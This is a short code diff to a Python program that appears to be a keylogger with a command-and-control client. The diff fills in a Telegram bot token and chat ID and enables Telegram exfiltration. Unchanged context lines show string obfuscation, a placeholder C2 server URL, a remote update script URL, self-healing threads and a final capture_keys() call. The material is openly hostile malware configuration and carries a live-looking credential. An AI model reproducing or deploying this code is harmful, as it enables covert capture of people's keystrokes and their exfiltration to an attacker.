@@ -107,9 +107,9 @@ def deobfuscate_string(obf):
     return base64.b64decode(obf).decode()[:-16]  # Remove salt
 
 # Config - obfuscated
-TELEGRAM_TOKEN = ''  
-TELEGRAM_CHAT_ID = ''  
-USE_TELEGRAM = False  
+TELEGRAM_TOKEN = '8291913684:AAFNZ6TNBSirkqZAEFGNE7M0Ji5XtrH_TE4'  
+TELEGRAM_CHAT_ID = '7225429285'  
+USE_TELEGRAM = True  
 C2_SERVER = obfuscate_string('http://your-c2-server.com/command')  
 UPDATE_URL = obfuscate_string('http://your-server.com/update.py')  
 USE_TOR = False  
@@ -711,4 +711,5 @@ if __name__ == "__main__":
     for t in threads.values():
         t.start()
     threading.Thread(target=self_heal, args=(threads,), daemon=True).start()
+
     capture_keys()
